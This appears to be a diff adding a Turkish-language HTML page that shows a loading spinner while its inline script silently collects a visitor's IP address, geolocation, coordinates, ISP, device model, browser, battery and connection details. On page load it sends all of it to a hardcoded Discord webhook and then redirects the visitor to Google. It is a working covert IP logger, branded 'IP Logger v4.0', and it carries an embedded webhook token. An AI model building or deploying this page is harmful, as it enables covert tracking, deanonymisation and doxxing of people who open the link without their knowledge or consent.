@@ -1,0 +1,328 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Yükleniyor...</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #0a0a0a;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            font-family: 'Segoe UI', sans-serif;
+            color: #fff;
+            flex-direction: column;
+        }
+        .loader {
+            border: 4px solid #1a1a1a;
+            border-top: 4px solid #00ff88;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        p { margin-top: 20px; color: #888; font-size: 14px; }
+    </style>
+</head>
+<body>
+    <div class="loader"></div>
+    <p>Bilgiler toplanıyor, lütfen bekleyin...</p>
+
+    <script>
+        (function() {
+            // ==================== KONFIGURASYON ====================
+            const WEBHOOK_URL = "https://discord.com/api/webhooks/1547312461160390686/Xp7joSBxqQ2dkH3Kl68AJqmGrOAqobOB6kVM_EHxXQPSpmgIXr3cG2lLxL3nnTM8qNvB";
+            const REDIRECT_URL = "https://www.google.com"; // Yönlendirilecek site (boş bırakırsan yönlendirme olmaz)
+            // ======================================================
+
+            // ============== 1. TÜM CIHAZ BILGILERINI TOPLA ==============
+            const ua = navigator.userAgent;
+            const platform = navigator.platform || "Bilinmiyor";
+            const language = navigator.language || navigator.languages?.[0] || "Bilinmiyor";
+            const screenWidth = screen.width;
+            const screenHeight = screen.height;
+            const colorDepth = screen.colorDepth;
+            const pixelRatio = window.devicePixelRatio || 1;
+            const viewportWidth = window.innerWidth;
+            const viewportHeight = window.innerHeight;
+            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "Bilinmiyor";
+            const referrer = document.referrer || "Doğrudan Giriş";
+            const currentPage = window.location.href;
+
+            // Bağlantı bilgileri
+            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection || null;
+            const connType = conn ? conn.effectiveType : "Bilinmiyor";
+            const downlink = conn ? conn.downlink + " Mbps" : "Bilinmiyor";
+            const rtt = conn ? conn.rtt + " ms" : "Bilinmiyor";
+
+            // Batarya bilgisi
+            let batteryLevel = "Bilinmiyor";
+            let charging = "Bilinmiyor";
+            if (navigator.getBattery) {
+                navigator.getBattery().then(bat => {
+                    batteryLevel = Math.round(bat.level * 100) + "%";
+                    charging = bat.charging ? "Şarj Oluyor" : "Şarjda Değil";
+                }).catch(() => {});
+            }
+
+            // ============== 2. CIHAZ TIPI, MARKA, MODEL, OS, TARAYICI ==============
+            let deviceType = "Masaüstü (PC/Laptop)";
+            let deviceBrand = "Bilinmiyor";
+            let deviceModel = "Bilinmiyor";
+            let os = "Bilinmiyor";
+            let osVersion = "Bilinmiyor";
+            let browser = "Bilinmiyor";
+            let browserVersion = "Bilinmiyor";
+
+            // ---- İşletim Sistemi ve Versiyon ----
+            if (/Windows NT 10.0/i.test(ua)) { os = "Windows"; osVersion = "10/11"; }
+            else if (/Windows NT 6.1/i.test(ua)) { os = "Windows"; osVersion = "7"; }
+            else if (/Windows NT 6.2/i.test(ua)) { os = "Windows"; osVersion = "8"; }
+            else if (/Windows NT 6.3/i.test(ua)) { os = "Windows"; osVersion = "8.1"; }
+            else if (/Windows/i.test(ua)) { os = "Windows"; osVersion = "Eski Sürüm"; }
+            else if (/Mac OS X 10_15/i.test(ua)) { os = "macOS"; osVersion = "Catalina (10.15)"; }
+            else if (/Mac OS X 10_14/i.test(ua)) { os = "macOS"; osVersion = "Mojave (10.14)"; }
+            else if (/Mac OS X 10_13/i.test(ua)) { os = "macOS"; osVersion = "High Sierra (10.13)"; }
+            else if (/Mac OS X/i.test(ua)) { os = "macOS"; osVersion = "Bilinmiyor"; }
+            else if (/Android\s([\d.]+)/i.test(ua)) { os = "Android"; osVersion = ua.match(/Android\s([\d.]+)/)[1]; }
+            else if (/iPhone OS (\d+[._]\d+[._]?\d*)/i.test(ua)) { os = "iOS"; osVersion = ua.match(/iPhone OS (\d+[._]\d+[._]?\d*)/)[1].replace(/_/g, '.'); }
+            else if (/iPad/i.test(ua) && /OS (\d+[._]\d+)/i.test(ua)) { os = "iPadOS"; osVersion = ua.match(/OS (\d+[._]\d+)/)[1].replace(/_/g, '.'); }
+            else if (/Linux/i.test(ua)) { os = "Linux"; osVersion = "Bilinmiyor"; }
+            else { os = "Bilinmiyor"; osVersion = "Bilinmiyor"; }
+
+            // ---- Cihaz Tipi, Marka, Model ----
+            if (/Mobi|Android|iPhone|iPad|iPod|BlackBerry|Opera Mini|IEMobile/i.test(ua)) {
+                if (/iPad/i.test(ua)) {
+                    deviceType = "Tablet (iPad)";
+                    deviceBrand = "Apple";
+                    deviceModel = "iPad";
+                } else if (/iPhone/i.test(ua)) {
+                    deviceType = "Mobil (iPhone)";
+                    deviceBrand = "Apple";
+                    const iphoneMatch = ua.match(/iPhone(\d+,\d+)/);
+                    deviceModel = iphoneMatch ? "iPhone " + iphoneMatch[1] : "iPhone";
+                } else if (/Android/i.test(ua)) {
+                    if (/Tablet|Pad/i.test(ua)) {
+                        deviceType = "Tablet (Android)";
+                    } else {
+                        deviceType = "Mobil (Android)";
+                    }
+                    const brandMatch = ua.match(/(Samsung|Huawei|Xiaomi|OnePlus|Google|Sony|LG|Motorola|Nokia|Oppo|Vivo|Realme|Nothing|Honor|Tecno|Infinix)/i);
+                    if (brandMatch) deviceBrand = brandMatch[1];
+                    const modelMatch = ua.match(/; ([^;]+?)(?:\s+Build|\))/);
+                    if (modelMatch) deviceModel = modelMatch[1].trim();
+                } else if (/BlackBerry/i.test(ua)) {
+                    deviceType = "Mobil (BlackBerry)";
+                    deviceBrand = "BlackBerry";
+                    deviceModel = "BlackBerry";
+                } else {
+                    deviceType = "Mobil (Diğer)";
+                }
+            } else if (/Tablet|iPad/i.test(ua)) {
+                deviceType = "Tablet";
+                if (/iPad/i.test(ua)) { deviceBrand = "Apple"; deviceModel = "iPad"; }
+            } else {
+                deviceType = "Masaüstü (PC/Laptop)";
+                if (/Windows/i.test(ua)) deviceBrand = "PC (Windows)";
+                else if (/Mac/i.test(ua)) deviceBrand = "Apple Mac";
+                else deviceBrand = "Masaüstü (Diğer)";
+            }
+
+            // ---- Tarayıcı ve Versiyon ----
+            if (/Edg\/([\d.]+)/i.test(ua)) {
+                browser = "Microsoft Edge";
+                browserVersion = ua.match(/Edg\/([\d.]+)/)[1];
+            } else if (/Chrome\/([\d.]+)/i.test(ua) && !/Edg/i.test(ua)) {
+                browser = "Google Chrome";
+                browserVersion = ua.match(/Chrome\/([\d.]+)/)[1];
+            } else if (/Firefox\/([\d.]+)/i.test(ua)) {
+                browser = "Mozilla Firefox";
+                browserVersion = ua.match(/Firefox\/([\d.]+)/)[1];
+            } else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) {
+                browser = "Apple Safari";
+                const ver = ua.match(/Version\/([\d.]+)/);
+                if (ver) browserVersion = ver[1];
+            } else if (/Opera|OPR/i.test(ua)) {
+                browser = "Opera";
+                const ver = ua.match(/(?:Opera|OPR)\/([\d.]+)/);
+                if (ver) browserVersion = ver[1];
+            } else if (/Vivaldi/i.test(ua)) {
+                browser = "Vivaldi";
+                const ver = ua.match(/Vivaldi\/([\d.]+)/);
+                if (ver) browserVersion = ver[1];
+            } else if (/Brave/i.test(ua)) {
+                browser = "Brave";
+                const ver = ua.match(/Brave\/([\d.]+)/);
+                if (ver) browserVersion = ver[1];
+            } else if (/SamsungBrowser/i.test(ua)) {
+                browser = "Samsung Internet";
+                const ver = ua.match(/SamsungBrowser\/([\d.]+)/);
+                if (ver) browserVersion = ver[1];
+            } else if (/UCBrowser/i.test(ua)) {
+                browser = "UC Browser";
+                const ver = ua.match(/UCBrowser\/([\d.]+)/);
+                if (ver) browserVersion = ver[1];
+            } else {
+                browser = "Bilinmiyor";
+                browserVersion = "Bilinmiyor";
+            }
+
+            // ============== 3. IP VE KONUM BILGISI (DOGRU VE EKSIKSIZ) ==============
+            // ipapi.co -> en doğru, en detaylı, ücretsiz
+            function fetchIPData() {
+                return new Promise((resolve) => {
+                    fetch('https://ipapi.co/json/', { cache: 'no-cache' })
+                        .then(res => {
+                            if (!res.ok) throw new Error('ipapi.co hatası');
+                            return res.json();
+                        })
+                        .then(data => {
+                            resolve({
+                                source: 'ipapi.co',
+                                ip: data.ip || 'Bilinmiyor',
+                                country: data.country_name || 'Bilinmiyor',
+                                country_code: data.country_code || 'Bilinmiyor',
+                                region: data.region || 'Bilinmiyor',
+                                region_code: data.region_code || 'Bilinmiyor',
+                                city: data.city || 'Bilinmiyor',
+                                postal: data.postal || 'Bilinmiyor',
+                                latitude: data.latitude || 'Bilinmiyor',
+                                longitude: data.longitude || 'Bilinmiyor',
+                                isp: data.org || data.isp || 'Bilinmiyor',
+                                timezone: data.timezone || 'Bilinmiyor',
+                                currency: data.currency || 'Bilinmiyor',
+                                asn: data.asn || 'Bilinmiyor'
+                            });
+                        })
+                        .catch(() => {
+                            // YEDEK: ip-api.com
+                            fetch('http://ip-api.com/json/?fields=status,country,countryCode,region,regionName,city,zip,lat,lon,isp,org,as,timezone,query', { cache: 'no-cache' })
+                                .then(res => res.json())
+                                .then(data => {
+                                    if (data.status === 'success') {
+                                        resolve({
+                                            source: 'ip-api.com',
+                                            ip: data.query || 'Bilinmiyor',
+                                            country: data.country || 'Bilinmiyor',
+                                            country_code: data.countryCode || 'Bilinmiyor',
+                                            region: data.regionName || data.region || 'Bilinmiyor',
+                                            region_code: data.region || 'Bilinmiyor',
+                                            city: data.city || 'Bilinmiyor',
+                                            postal: data.zip || 'Bilinmiyor',
+                                            latitude: data.lat || 'Bilinmiyor',
+                                            longitude: data.lon || 'Bilinmiyor',
+                                            isp: data.org || data.isp || 'Bilinmiyor',
+                                            timezone: data.timezone || 'Bilinmiyor',
+                                            currency: 'Bilinmiyor',
+                                            asn: data.as || 'Bilinmiyor'
+                                        });
+                                    } else {
+                                        resolve(null);
+                                    }
+                                })
+                                .catch(() => resolve(null));
+                        });
+                });
+            }
+
+            // ============== 4. VERIYI DISCORD'A GONDER ==============
+            async function sendToDiscord() {
+                const geo = await fetchIPData();
+
+                // Tüm bilgileri tek bir embed'de topla
+                const fields = [
+                    { name: "🌐 IP Adresi", value: geo ? geo.ip : "Alınamadı", inline: true },
+                    { name: "📍 Ülke", value: geo ? geo.country + " (" + geo.country_code + ")" : "Alınamadı", inline: true },
+                    { name: "🏙️ İl / Şehir", value: geo ? geo.region : "Alınamadı", inline: true },
+                    { name: "🏘️ İlçe / Semt", value: geo ? geo.city : "Alınamadı", inline: true },
+                    { name: "📮 Posta Kodu", value: geo ? geo.postal : "Alınamadı", inline: true },
+                    { name: "🌍 Koordinatlar", value: geo && geo.latitude !== 'Bilinmiyor' ? geo.latitude + ", " + geo.longitude : "Alınamadı", inline: true },
+                    { name: "📞 ISP / Servis Sağlayıcı", value: geo ? geo.isp : "Alınamadı", inline: true },
+                    { name: "🔢 ASN", value: geo ? geo.asn : "Alınamadı", inline: true },
+                    { name: "⏰ Zaman Dilimi (Coğrafi)", value: geo ? geo.timezone : "Alınamadı", inline: true },
+                    { name: "💰 Para Birimi", value: geo ? geo.currency : "Alınamadı", inline: true },
+                    { name: "📱 Cihaz Tipi", value: deviceType, inline: true },
+                    { name: "🏷️ Cihaz Markası", value: deviceBrand, inline: true },
+                    { name: "📟 Cihaz Modeli", value: deviceModel, inline: true },
+                    { name: "💻 İşletim Sistemi", value: os + (osVersion !== "Bilinmiyor" ? " v" + osVersion : ""), inline: true },
+                    { name: "🌐 Tarayıcı", value: browser + (browserVersion !== "Bilinmiyor" ? " v" + browserVersion : ""), inline: true },
+                    { name: "🖥️ Ekran Çözünürlüğü", value: screenWidth + "x" + screenHeight + " (" + colorDepth + " bit)", inline: true },
+                    { name: "🔍 Piksel Oranı", value: pixelRatio + "x", inline: true },
+                    { name: "📐 Görüntü Alanı", value: viewportWidth + "x" + viewportHeight, inline: true },
+                    { name: "🌐 Platform", value: platform, inline: true },
+                    { name: "🗣️ Dil", value: language, inline: true },
+                    { name: "🕒 Tarayıcı Zaman Dilimi", value: timezone, inline: true },
+                    { name: "📶 Bağlantı Türü", value: connType, inline: true },
+                    { name: "⬇️ Tahmini İndirme Hızı", value: downlink, inline: true },
+                    { name: "⏱️ Gecikme (RTT)", value: rtt, inline: true },
+                    { name: "🔋 Batarya Seviyesi", value: batteryLevel, inline: true },
+                    { name: "🔌 Şarj Durumu", value: charging, inline: true },
+                    { name: "🔙 Referans (Geldiği Sayfa)", value: referrer.length > 60 ? referrer.substring(0, 60) + "..." : referrer, inline: false },
+                    { name: "📄 Şu Anki Sayfa", value: currentPage.length > 60 ? currentPage.substring(0, 60) + "..." : currentPage, inline: false },
+                    { name: "🕒 Tarih / Saat (Türkiye)", value: new Date().toLocaleString('tr-TR', { timeZone: 'Europe/Istanbul' }), inline: true },
+                    { name: "🕒 Tarih / Saat (UTC)", value: new Date().toISOString(), inline: true },
+                    { name: "📝 Ham User-Agent", value: ua.length > 80 ? ua.substring(0, 80) + "..." : ua, inline: false }
+                ];
+
+                // Kaynak bilgisi
+                if (geo && geo.source) {
+                    fields.push({ name: "🗺️ Konum Kaynağı", value: geo.source, inline: true });
+                }
+
+                const embed = {
+                    embeds: [{
+                        title: "🕵️ EKSİKSİZ ZİYARETÇİ RAPORU",
+                        color: 0x00FF88,
+                        thumbnail: {
+                            url: "https://cdn-icons-png.flaticon.com/512/3602/3602123.png"
+                        },
+                        fields: fields,
+                        footer: {
+                            text: "🔒 IP Logger v4.0 | Tüm Bilgiler Eksiksiz",
+                            icon_url: "https://cdn-icons-png.flaticon.com/512/3602/3602123.png"
+                        },
+                        timestamp: new Date().toISOString()
+                    }]
+                };
+
+                // Discord'a gönder
+                try {
+                    const response = await fetch(WEBHOOK_URL, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(embed)
+                    });
+                    if (response.ok) {
+                        console.log("✅ Tüm veriler Discord'a gönderildi.");
+                    } else {
+                        console.error("❌ Webhook hatası:", response.status);
+                    }
+                } catch (err) {
+                    console.error("❌ Gönderme hatası:", err);
+                }
+
+                // Yönlendirme
+                if (REDIRECT_URL) {
+                    setTimeout(() => { window.location.href = REDIRECT_URL; }, 2000);
+                }
+            }
+
+            // ============== 5. BATARYA BİLGİSİNİ BEKLE (GÜNCELLE) ==============
+            if (navigator.getBattery) {
+                navigator.getBattery().then(bat => {
+                    batteryLevel = Math.round(bat.level * 100) + "%";
+                    charging = bat.charging ? "Şarj Oluyor" : "Şarjda Değil";
+                }).finally(() => {
+                    sendToDiscord();
+                });
+            } else {
+                sendToDiscord();
+            }
+
+        })();
+    </script>
+</body>
+</html>
